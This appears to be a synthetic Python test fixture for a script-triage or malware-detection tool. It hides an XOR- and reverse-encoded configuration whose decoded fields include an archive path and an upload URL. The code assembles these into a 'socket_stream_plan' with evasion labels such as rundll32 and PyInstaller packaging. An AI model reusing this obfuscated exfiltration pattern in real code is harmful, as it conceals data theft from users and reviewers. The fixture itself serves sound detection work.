#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_62357695 = "5a4350044c4c4f191a491e4b1a4e074f42494b4905484b6659594f585e445f62054b5e4b6e474b584d45587a05106917425e4b5a754f5c434249584b564e4b45465a5f054e43464b5c4443044f465a474b524f044c4c4f191a491e4b1a4e050510595a5e5e421746585f754e4b45465a5f564c4c4f191a491e4b1a4e07444d434b5a474b49174e4375444d434b5a474b4956584559594f494f4e4f585a75181946464e445f581744434b424975595d454e44435d5658434e4f444575584f46464b5e594443535a17584f4358584b49564445435e494f58434e4443754b4e48474b46174445435e4b49595f4c48455642495e4b5a59434e7553584b4445435e49434e17524b5e445359561b175e445f4549754f4d4b5e5956444b465a75474b4f585e59755e4f4149455917584f5e5a4b4e4b564f5e45474f58755e434759444b585e064f5c434249584b754f4e4549444f06464b494546755e494f4646454917595a4f5e595618175c"

CODEC_62357695 = "hex_literal|reverse_then_xor|2a"



def load_62357695():

    return bytes.fromhex(MATERIAL_62357695)



def decode_62357695(v_a19c):

    return bytes(value ^ 42 for value in reversed(v_a19c))



def recover_62357695():

    v_d41a = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")

    _pass = 0

    while _pass < 1:

        v_b27e = decode_62357695(load_62357695())

        _pass += 1

    v_c304 = v_b27e.decode("ascii", "strict")

    return v_c304



def inspect_62357695():

    view = memoryview(recover_62357695().encode("ascii"))

    return bytes(view).decode("ascii")



def surface_62357695():

    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}

    return routes["selected"]()



def obfuscation_62357695():

    recover = lambda value: value

    return recover("lambda_indirection")



def plan_62357695():

    fields = dict(item.split("=", 1) for item in inspect_62357695().split("|"))

    analysis_surface = surface_62357695()

    obfuscation_surface = obfuscation_62357695()

    operation_plan = ("socket_stream_plan", fields["archive_path"], fields["upload_url"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_62357695())

